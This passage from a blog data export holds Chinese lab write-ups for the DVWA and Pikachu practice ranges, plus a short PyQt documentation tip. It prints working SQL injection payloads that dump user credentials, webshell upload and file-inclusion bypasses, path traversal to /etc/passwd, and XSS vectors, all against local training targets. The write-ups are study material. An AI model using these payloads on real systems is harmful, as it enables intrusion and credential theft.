session，</p>\n<p>会出现一个新的页面，</p>\n<p>在新的页面修改的内容会同步到你原来的页面，</p>\n<p>因此你只需要burp抓一下包然后在新页面里面构造注入语句即可</p>\n<h1 id=\"Sql-injection-Blind\"><a href=\"#Sql-injection-Blind\" class=\"headerlink\" title=\"Sql-injection(Blind)\"></a>Sql-injection(Blind)</h1><p>又到了最讨厌也是最麻烦的盲注了。。。<br>讲一下思路吧</p>\n<h2 id=\"Low-1\"><a href=\"#Low-1\" class=\"headerlink\" title=\"Low\"></a>Low</h2><p>这个输入正常id提示“User ID exists in the database.”<br>输入错误id提示“User ID is MISSING from the database.”<br>然后判断出闭合是一个单引号，然后?id&#x3D;1’–+提示正常<br>然后接下来判断是否具备布尔盲注条件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27; and 1=1--+   正常<br>?id=1&#x27; and 1=2--+   不正常<br></code></pre></td></tr></table></figure>\n<p>那么接下来就是构造payload了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27; and length(database())=4  正常<br></code></pre></td></tr></table></figure>\n<p>说明数据库一共有4个字符<br>之后的略，自行脑补</p>\n<h2 id=\"Medium-1\"><a href=\"#Medium-1\" class=\"headerlink\" title=\"Medium\"></a>Medium</h2><p>这个依旧是post注入，<br>burp抓包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">id=1&amp;Submit=Submit<br></code></pre></td></tr></table></figure>\n<p>然后注入类型是数字型注入，<br>接下来判断是否具备布尔盲注条件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">id=1 and 1=1&amp;Submit=Submit  正常<br>id=1 and 1=2&amp;Submit=Submit  不正常<br></code></pre></td></tr></table></figure>\n<p>那么接下来的注入语句就和上面几乎一样了</p>\n<h2 id=\"High-1\"><a href=\"#High-1\" class=\"headerlink\" title=\"High\"></a>High</h2><p>这。。。。。搞不懂和上面一关有什么区别<br>不就是新开一个页面然后构造和上面一样的注入语句吗</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">id=1&#x27;&amp;Submit=Submit  不正常<br>id=1&quot;&amp;Submit=Submit  正常<br></code></pre></td></tr></table></figure>\n<p>说明是单引号闭合</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">id=1&#x27; and 1=1#&amp;Submit=Submit<br>id=1&#x27; and 1=2&amp;Submit=Submit<br></code></pre></td></tr></table></figure>\n<p>说明具备布尔盲注条件，剩下的略</p>\n<h1 id=\"File-upload\"><a href=\"#File-upload\" class=\"headerlink\" title=\"File-upload\"></a>File-upload</h1><h2 id=\"Low-2\"><a href=\"#Low-2\" class=\"headerlink\" title=\"Low\"></a>Low</h2><p>这一关似乎直接上传php文件就好了，没有任何限制，</p>\n<p>他甚至贴心的给出了shell的路径，</p>\n<p>尝试访问—–成功</p>\n<h2 id=\"Medium-2\"><a href=\"#Medium-2\" class=\"headerlink\" title=\"Medium\"></a>Medium</h2><p>这一关直接上传shell会被打回</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">Your image was not uploaded. We can only accept JPEG or PNG images.<br></code></pre></td></tr></table></figure>\n\n<p>很简单还是添加文件头然后bp抓包改数据，注意只能png和jpg</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">../../hackable/uploads/out.php succesfully uploaded!<br></code></pre></td></tr></table></figure>\n\n<p>成功，然后访问—–成功</p>\n<h2 id=\"High-2\"><a href=\"#High-2\" class=\"headerlink\" title=\"High\"></a>High</h2><p>这一关中前面的手法用不了了，看看能不能在后缀名上做点手脚</p>\n<ul>\n<li>添加空格</li>\n<li>添加”.”</li>\n<li>添加::$DATA</li>\n</ul>\n<p>都失败了，查看源代码，分析一下</p>\n\n\n<p>看到黄色框框圈出来的东西，就可以判断出是这个东西过滤了我们的东西，</p>\n<p>此时其实可以尝试上传.htaccess文件来bypass，但是我的环境有问题，</p>\n<p>换一种思路————&gt;文件包含漏洞！</p>\n<p>找到位于dvwa\\vulnerabilities\\fi目录下的include.php文件，</p>\n<p>然后在文件上传关卡上传图片马，</p>\n<p>随后通过include.php用相对路径访问图片马</p>\n\n\n<p>成功！</p>\n<h1 id=\"File-inclusion\"><a href=\"#File-inclusion\" class=\"headerlink\" title=\"File-inclusion\"></a>File-inclusion</h1><p>此漏洞应该是一个配合文件上传漏洞的bypass方式吧，</p>\n<p>因此webshell需要自己上传，无法通过本关卡的漏洞上传</p>\n<p>现在shell.php的位置是Dvwa靶场的根目录下</p>\n<h2 id=\"Low-3\"><a href=\"#Low-3\" class=\"headerlink\" title=\"Low\"></a>Low</h2><p>简单阅读一下源代码，发现传参应该是：?page&#x3D;xxx.php</p>\n<p>直接访问shell即可，可以通过绝对路径，也可以通过相对路径</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?page=../../shell.php<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"Medium-3\"><a href=\"#Medium-3\" class=\"headerlink\" title=\"Medium\"></a>Medium</h2><p>这一关使用上面的url访问会出现报错</p>\n<p>简单看一下源代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-comment\">// The page we wish to display</span><br><span class=\"hljs-variable\">$file</span> = <span class=\"hljs-variable\">$_GET</span>[ <span class=\"hljs-string\">&#x27;page&#x27;</span> ];<br><br><span class=\"hljs-comment\">// Input validation</span><br><span class=\"hljs-variable\">$file</span> = <span class=\"hljs-title function_ invoke__\">str_replace</span>( <span class=\"hljs-keyword\">array</span>( <span class=\"hljs-string\">&quot;http://&quot;</span>, <span class=\"hljs-string\">&quot;https://&quot;</span> ), <span class=\"hljs-string\">&quot;&quot;</span>, <span class=\"hljs-variable\">$file</span> );<br><span class=\"hljs-variable\">$file</span> = <span class=\"hljs-title function_ invoke__\">str_replace</span>( <span class=\"hljs-keyword\">array</span>( <span class=\"hljs-string\">&quot;../&quot;</span>, <span class=\"hljs-string\">&quot;..\\\\&quot;</span> ), <span class=\"hljs-string\">&quot;&quot;</span>, <span class=\"hljs-variable\">$file</span> );<br><br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>看出来这是被过滤了，</p>\n<p>所有的”http:&#x2F;&#x2F;“, “https:&#x2F;&#x2F;“, “..&#x2F;“, “..\\“都被替换成了空格</p>\n<p>但是这个有一个很明显的问题，就是他没有进行多次过滤，</p>\n<p>可以尝试复写过滤字符串的方式bypass</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?page=..././..././shell.php<br></code></pre></td></tr></table></figure>\n\n<p>👌</p>\n<h2 id=\"High-3\"><a href=\"#High-3\" class=\"headerlink\" title=\"High\"></a>High</h2><p>使用Low关卡的url会直接报错，但是和前面一个关的报错不同的是，</p>\n<p>这次的整个页面都没了，报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">ERROR: File not found!<br></code></pre></td></tr></table></figure>\n\n<p>没有这个文件？那应该是将后缀名过滤了？尝试复写php字符串</p>\n<p>不行。。。。。看一下源代码吧</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-comment\">// The page we wish to display</span><br><span class=\"hljs-variable\">$file</span> = <span class=\"hljs-variable\">$_GET</span>[ <span class=\"hljs-string\">&#x27;page&#x27;</span> ];<br><br><span class=\"hljs-comment\">// Input validation</span><br><span class=\"hljs-keyword\">if</span>( !<span class=\"hljs-title function_ invoke__\">fnmatch</span>( <span class=\"hljs-string\">&quot;file*&quot;</span>, <span class=\"hljs-variable\">$file</span> ) &amp;&amp; <span class=\"hljs-variable\">$file</span> != <span class=\"hljs-string\">&quot;include.php&quot;</span> ) &#123;<br>\t<span class=\"hljs-comment\">// This isn&#x27;t the page we want!</span><br>\t<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;ERROR: File not found!&quot;</span>;<br>\t<span class=\"hljs-keyword\">exit</span>;<br>&#125;<br><br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>看不懂源码的苦😭看一下别人的writeup吧</p>\n\n\n<p>url，绝对路径：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?page=file:///D:\\Home\\phpstudy_pro\\WWW\\dvwa\\shell.php<br></code></pre></td></tr></table></figure>\n\n<p>结束</p>\n<h1 id=\"XSS-Reflacted\"><a href=\"#XSS-Reflacted\" class=\"headerlink\" title=\"XSS-Reflacted\"></a>XSS-Reflacted</h1><h2 id=\"Low-4\"><a href=\"#Low-4\" class=\"headerlink\" title=\"Low\"></a>Low</h2><p>直接构造最简单的payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&lt;script&gt;alert(1)&lt;/script&gt;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"Medium-4\"><a href=\"#Medium-4\" class=\"headerlink\" title=\"Medium\"></a>Medium</h2><p>用上一关的payload发现被过滤只剩下了alert(1)，尝试大小写绕过，直接成功</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&lt;scriPt&gt;alert(1)&lt;/scrIpt&gt;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"High-4\"><a href=\"#High-4\" class=\"headerlink\" title=\"High\"></a>High</h2><p>用上一关的payload发现只剩下了一个尖括号，测试输入一堆尖括号&lt;&gt;不过滤，那么应该是对script作了过滤，尝试使用其他的语句，例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&lt;img src=114514 onerror=alert(1)&gt;<br></code></pre></td></tr></table></figure>\n\n<p>成功通关！</p>\n<hr>\n<p>存储型和Dom型的打靶已经记录在了《存储型,Dom型Xss注入学习笔记》这篇文章中</p>\n","categories":["Web"],"tags":["xss","sql","file_upload","file_inclusion"]},{"title":"PyQt助手下载","url":"/2023/04/26/PyQt%E5%8A%A9%E6%89%8B%E4%B8%8B%E8%BD%BD/","content":"<p>qt的帮助文档在默认是没有的，</p>\n<p>需要我们下载帮助文档才可以看到</p>\n<span id=\"more\"></span>\n\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>看我最近的博客就知道，</p>\n<p>我在学习pyside6，</p>\n<p>那么对于每个组件的属性</p>\n<ul>\n<li><p>信号</p>\n</li>\n<li><p>属性</p>\n</li>\n</ul>\n<p>等东西都是需要知道的，</p>\n<p>那么帮助文档尤为重要</p>\n<h1 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">pip install PyQtdoc<br></code></pre></td></tr></table></figure>\n\n<p>然后在解释器的Lib&#x2F;site-packges&#x2F;PyQtdoc里面就可以看到一堆的qch文件</p>\n<p>然后打开qt助手（assistant.exe）</p>\n<p>左上角编辑-首选项-文档-add</p>\n<p> 把刚才的路径打开，</p>\n<p>然后ctrl a全选，</p>\n<p>点击打开就添加成功了</p>\n\n","categories":["PySide6"],"tags":["python"]},{"title":"Pikachu打靶随记","url":"/2023/06/18/Pikachu%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/","content":"<p>这篇文章的靶场是Pikachu</p>\n<span id=\"more\"></span>\n\n<h1 id=\"Sql注入\"><a href=\"#Sql注入\" class=\"headerlink\" title=\"Sql注入\"></a>Sql注入</h1><h2 id=\"第一关-数字型注入（Post）\"><a href=\"#第一关-数字型注入（Post）\" class=\"headerlink\" title=\"第一关 数字型注入（Post）\"></a>第一关 数字型注入（Post）</h2><p>Burpsuite抓包然后修改参数注入即可</p>\n<h2 id=\"第二关-字符型注入（Get）\"><a href=\"#第二关-字符型注入（Get）\" class=\"headerlink\" title=\"第二关 字符型注入（Get）\"></a>第二关 字符型注入（Get）</h2><p>同样修改参数name进行注入即可</p>\n<h2 id=\"第三关-搜索型注入\"><a href=\"#第三关-搜索型注入\" class=\"headerlink\" title=\"第三关 搜索型注入\"></a>第三关 搜索型注入</h2><p>这一关需要好好记录一下，遇到了一种新的注入，</p>\n<p>之前我们判断闭合的方式是单引号或双引号+n个括号，</p>\n<p>但是在这里你就会发现，他是单引号闭合加上的不是括号，</p>\n<p>导致你怎么也试不出来，无奈之下看了一下别人的writeup：</p>\n\n\n<p>Like语句我之前sql注入学习笔记#17介绍过了</p>\n<p>也就是说，如果要闭合，应该是  “  %’  ”</p>\n<p>那么之后的就一样了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?name=1%&#x27;) order by 2--+&amp;submit=%E6%9F%A5%E8%AF%A2   获取字段数<br><br>1%&#x27;) union select 1,2--+&amp;submit=%E6%9F%A5%E8%AF%A2   注出回显点<br><br>?name=1%&#x27;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+&amp;submit=%E6%9F%A5%E8%AF%A2 获取数据库中的表格<br><br>?name=1%&#x27;) union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;--+&amp;submit=%E6%9F%A5%E8%AF%A2  获取表格中的列名<br><br>?name=1%&#x27;) union select 1,group_concat(id,username,password,level) from users--+&amp;submit=%E6%9F%A5%E8%AF%A2  获取列名下的数据<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"第四关-xx型注入\"><a href=\"#第四关-xx型注入\" class=\"headerlink\" title=\"第四关 xx型注入\"></a>第四关 xx型注入</h2><p>这一关估计是不想告诉我们这是什么注入吧。。。</p>\n<p>但是他似乎和上面的字符型注入同理，只不过是闭合是单引号+括号</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">name=&#x27;) union select 1,2 --+&amp;submit=%E6%9F%A5%E8%AF%A2<br></code></pre></td></tr></table></figure>\n\n<p>剩下的就都一样了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?name=1&#x27;) union select 1,group_concat(id,username,password,level) from users--+&amp;submit=%E6%9F%A5%E8%AF%A2   最后一步获取全部数据<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"第五关-insert、update注入\"><a href=\"#第五关-insert、update注入\" class=\"headerlink\" title=\"第五关 insert、update注入\"></a>第五关 insert、update注入</h2><p>这个注入之前也已经在学习笔记里面讲过了，</p>\n<p>应该是在http头下注入的那一篇，简单讲一下原理</p>\n<hr>\n<p>原来的语句是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mysql\">insert into users (id,username,password,level) values (&#x27;4&#x27;,&#x27;$username&#x27;,&#x27;114514&#x27;,&#x27;1&#x27;);<br></code></pre></td></tr></table></figure>\n\n<p>然后构造我们的payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27; or extractvalue(1,concat(0x7e,(database()))),2,3,4)#<br></code></pre></td></tr></table></figure>\n\n<p>此时，原来的语句就变成了：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mysql\">insert into users (id,username,password,level) values (&#x27;4&#x27;,&#x27;&#x27; or extractvalue(1,concat(0x7e,(database()))),2,3,4)#&#x27;,&#x27;114514&#x27;,&#x27;1&#x27;);<br></code></pre></td></tr></table></figure>\n\n<p>去掉注释后面的内容，可以理解为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mysql\">insert into users (id,username,password,level) values (&#x27;4&#x27;,&#x27;&#x27; or extractvalue(1,concat(0x7e,(database()))),2,3,4)<br></code></pre></td></tr></table></figure>\n\n<hr>\n<p>现在理论讲完了，实操一下吧，</p>\n<p>首先来到pikachu的insert、update注入靶场，点击下面的注册，</p>\n<p>因为只有注册才会涉及到insert函数，</p>\n<p>然后可以看到一共有6行，因此要构造6个参数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27; or extractvalue(1,concat(0x7e,(database()))),2,3,4,5,6)#<br></code></pre></td></tr></table></figure>\n\n<p>于是，我们便可以得到回显：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">XPATH syntax error: &#x27;~pikachu&#x27;<br></code></pre></td></tr></table></figure>\n\n<p>接下来的语句，就是在上面的payload的0x7e后面修改注入语句了</p>\n<h2 id=\"第六关-delete注入\"><a href=\"#第六关-delete注入\" class=\"headerlink\" title=\"第六关 delete注入\"></a>第六关 delete注入</h2><p>是一个留言板，留言之后会出现一个“删除”按钮，</p>\n<p>那注入点不就来了吗👍burp抓一下包</p>\n\n\n<p>出现了id字样，开始构造payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">57+or+updatexml(1,concat(0x7e,database()),1)<br></code></pre></td></tr></table></figure>\n\n<p>这里我遇到了一个问题，为什么写空格不行要写“+”号？</p>\n<p>并且在本地MySQL测试中，空格是可以的，但是加号会报错</p>\n\n\n<hr>\n<p>思考了一下，觉得应该是程序会过滤空格，url会自动把加号转义为空格</p>\n<h2 id=\"第七关-http头注入\"><a href=\"#第七关-http头注入\" class=\"headerlink\" title=\"第七关 http头注入\"></a>第七关 http头注入</h2><p>这个之前也讲过了，这里就简单看看，</p>\n<p>原理和上面的insert注入原理相同</p>\n<hr>\n<p>这个靶场是一个登陆界面，首先想到的是万能密码，</p>\n<p>失败了，然后就是尝试http头注入了，</p>\n<p>但是我们首先需要获取账号和密码才可以进行注入，</p>\n<p>点开右上角提示就有了</p>\n<hr>\n<p>然后就可以开始注入了，这里有4个地方可以注入：</p>\n\n\n<p>我这里就选择ua注入了</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27; or extractvalue(1,concat(0x7e,(database()))) or &#x27; #<br></code></pre></td></tr></table></figure>\n\n<p>这个新的payload与之前不同的是，它不需要知道一共有几个参数，</p>\n<p>代入到语句之后，是这样：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mysql\">insert into users (id,username,password,level) values (&#x27;4&#x27;,&#x27;&#x27; or extractvalue(1,concat(0x7e,(database()))) or &#x27;&#x27;,&#x27;114514&#x27;,&#x27;1&#x27;);<br></code></pre></td></tr></table></figure>\n\n<p>同样可以执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">mysql&gt; insert into users (id,username,password,level) values (&#x27;4&#x27;,&#x27;&#x27; or extractvalue(1,concat(0x7e,(database()))) or &#x27;&#x27;,&#x27;114514&#x27;,&#x27;1&#x27;);<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~pikachu&#x27;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"第八-九关-盲注\"><a href=\"#第八-九关-盲注\" class=\"headerlink\" title=\"第八,九关 盲注\"></a>第八,九关 盲注</h2><p>盲注这个算了吧懒得搞了</p>\n<h2 id=\"第十关-宽字节注入\"><a href=\"#第十关-宽字节注入\" class=\"headerlink\" title=\"第十关 宽字节注入\"></a>第十关 宽字节注入</h2><p>payload同前面的字符型注入，</p>\n<p>在每个payload的最前面添加一个%df即可</p>\n<h1 id=\"文件包含漏洞\"><a href=\"#文件包含漏洞\" class=\"headerlink\" title=\"文件包含漏洞\"></a>文件包含漏洞</h1><h2 id=\"LFI-Local-File-Include\"><a href=\"#LFI-Local-File-Include\" class=\"headerlink\" title=\"LFI(Local File Include)\"></a>LFI(Local File Include)</h2><p>带你开第一关，随便选择一个篮球巨星，url如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file1.php&amp;submit=提交查询<br></code></pre></td></tr></table></figure>\n\n<p>这不就是妥妥的文件包含漏洞吗？！</p>\n<p>把shell.php放到根目录然后，构造语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?filename=../../../shell.php&amp;submit=提交查询<br></code></pre></td></tr></table></figure>\n\n<p>这里向前了3个目录，为什么呢？根目录不是在两个目录前吗？</p>\n<p>仔细看一下向前两个目录的报错信息：</p>\n\n\n<p>文件的代码是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">include/$filename<br></code></pre></td></tr></table></figure>\n\n<p>注意那个“ &#x2F; ”，代表他向前了一个目录，因此我们要向后一个目录抵消！</p>\n<h2 id=\"RFI-Remote-File-Include\"><a href=\"#RFI-Remote-File-Include\" class=\"headerlink\" title=\"RFI(Remote File Include)\"></a>RFI(Remote File Include)</h2><p>远程文件包含一样很简单，只需要把本地文件目录换成远程url即可</p>\n<p>这里用python开启一个web服务测试一下</p>\n\n\n<p>成功，我们可以利用文件包含的特性来执行非php格式的webshell</p>\n\n\n<h1 id=\"文件下载漏洞\"><a href=\"#文件下载漏洞\" class=\"headerlink\" title=\"文件下载漏洞\"></a>文件下载漏洞</h1><p>认识一下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">不安全的文件下载概述：<br>    文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。<br>    此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。 <br>    所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！ <br>    你可以通过“Unsafe file download”对应的测试栏目，来进一步的了解该漏洞。 <br></code></pre></td></tr></table></figure>\n\n<p>我的理解是burp抓包修改需要下载的文件的路径然后下载本无法下载的文件</p>\n<p>试一下</p>\n\n\n<p>ok！</p>\n<h1 id=\"文件上传漏洞\"><a href=\"#文件上传漏洞\" class=\"headerlink\" title=\"文件上传漏洞\"></a>文件上传漏洞</h1><h2 id=\"Client-Check\"><a href=\"#Client-Check\" class=\"headerlink\" title=\"Client Check\"></a>Client Check</h2><p>“前端的验证就是纸老虎，只需要burpsuite便可轻松捅破”</p>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t————null</p>\n<hr>\n<p>bp抓包改后缀，，，成功上传，结束</p>\n<h2 id=\"Mime-Type\"><a href=\"#Mime-Type\" class=\"headerlink\" title=\"Mime Type\"></a>Mime Type</h2><p>“Mime Type验证就是纸老虎，只需要GIF89a以及Content-type: image&#x2F;gif便可轻松捅破”</p>\n<p>​                                                                                       ————null</p>\n<hr>\n<p>就是在webshell前面加个GIF89a然后同上面的操作即可</p>\n<p>wc翻车了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">上传的图片只能是jpg,jpeg,png格式的！<br></code></pre></td></tr></table></figure>\n\n<p>不让我上传gif的，没事问题不大，绕过方式一样</p>\n\n\n<h2 id=\"Get-Image-Size\"><a href=\"#Get-Image-Size\" class=\"headerlink\" title=\"Get Image Size\"></a>Get Image Size</h2><p>看一下源代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-variable\">$html</span>=<span class=\"hljs-string\">&#x27;&#x27;</span>;<br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;submit&#x27;</span>]))&#123;<br>    <span class=\"hljs-variable\">$type</span>=<span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">&#x27;jpg&#x27;</span>,<span class=\"hljs-string\">&#x27;jpeg&#x27;</span>,<span class=\"hljs-string\">&#x27;png&#x27;</span>);<span class=\"hljs-comment\">//指定类型</span><br>    <span class=\"hljs-variable\">$mime</span>=<span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">&#x27;image/jpg&#x27;</span>,<span class=\"hljs-string\">&#x27;image/jpeg&#x27;</span>,<span class=\"hljs-string\">&#x27;image/png&#x27;</span>);<br>    <span class=\"hljs-variable\">$save_path</span>=<span class=\"hljs-string\">&#x27;uploads&#x27;</span>.<span class=\"hljs-title function_ invoke__\">date</span>(<span class=\"hljs-string\">&#x27;/Y/m/d/&#x27;</span>);<span class=\"hljs-comment\">//根据当天日期生成一个文件夹</span><br>    <span class=\"hljs-variable\">$upload</span>=<span class=\"hljs-title function_ invoke__\">upload</span>(<span class=\"hljs-string\">&#x27;uploadfile&#x27;</span>,<span class=\"hljs-string\">&#x27;512000&#x27;</span>,<span class=\"hljs-variable\">$type</span>,<span class=\"hljs-variable\">$mime</span>,<span class=\"hljs-variable\">$save_path</span>);<span class=\"hljs-comment\">//调用函数</span><br>    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$upload</span>[<span class=\"hljs-string\">&#x27;return&#x27;</span>])&#123;<br>        <span class=\"hljs-variable\">$html</span>.=<span class=\"hljs-string\">&quot;&lt;p class=&#x27;notice&#x27;&gt;文件上传成功&lt;/p&gt;&lt;p class=&#x27;notice&#x27;&gt;文件保存的路径为：<span class=\"hljs-subst\">&#123;$upload[&#x27;save_path&#x27;]&#125;</span>&lt;/p&gt;&quot;</span>;<br>    &#125;<span class=\"hljs-keyword\">else</span>&#123;<br>        <span class=\"hljs-variable\">$html</span>.=<span class=\"hljs-string\">&quot;&lt;p class=notice&gt;<span class=\"hljs-subst\">&#123;$upload[&#x27;error&#x27;]&#125;</span>&lt;/p&gt;&quot;</span>;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>这就是上传之后新建几个文件夹存放照片嘛。。。</p>\n<p>直接上传刚才的图片马然后bp改后缀然后F12看响应就可以知道路径了</p>\n<h1 id=\"XSS跨站攻击\"><a href=\"#XSS跨站攻击\" class=\"headerlink\" title=\"XSS跨站攻击\"></a>XSS跨站攻击</h1><h2 id=\"反射性xss（get）\"><a href=\"#反射性xss（get）\" class=\"headerlink\" title=\"反射性xss（get）\"></a>反射性xss（get）</h2><p>不看题直接构造payload：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span>alert(1)<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>成功通关（注意前端修改输入长度）</p>\n<h2 id=\"反射性xss（post）\"><a href=\"#反射性xss（post）\" class=\"headerlink\" title=\"反射性xss（post）\"></a>反射性xss（post）</h2><p>这一关已经将登陆密码放在了提示里面，我们要注入的不是这个登录页面，而是登陆后的东西</p>\n<p>我们直接在登录框输入payload：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span>alert(1)<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>就通关了，他和上面唯一的区别就是没有前端长度限制，不用自己修改了。。。。</p>\n<h2 id=\"DOM型xss\"><a href=\"#DOM型xss\" class=\"headerlink\" title=\"DOM型xss\"></a>DOM型xss</h2><p>（上面一题是存储型，在《存储型,Dom型Xss注入学习笔记》这篇文中已经及路过了因此跳过）</p>\n<hr>\n<p>一开始看不懂题啥意思，然后看了一下页面源码：</p>\n\n\n<p>就是a href注入啊，那直接构造payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">javascript:alert()<br></code></pre></td></tr></table></figure>\n\n<p>成功通关</p>\n<h2 id=\"DOM型xss-x\"><a href=\"#DOM型xss-x\" class=\"headerlink\" title=\"DOM型xss-x\"></a>DOM型xss-x</h2><p>这一关有点意思，让你输入一个东西，然后出现一个超链接，点开超链接还有一个超链接，那个超链接指向的最后一级路径就是你输入的那个东西。。。。没搞懂这怎么利用</p>\n<p>但是f12仔细又看了一下还是发现了注入点</p>\n\n\n<p>构造payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"XSS盲打\"><a href=\"#XSS盲打\" class=\"headerlink\" title=\"XSS盲打\"></a>XSS盲打</h2><p>首先在留言框输入payload：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span>alert(1)<span 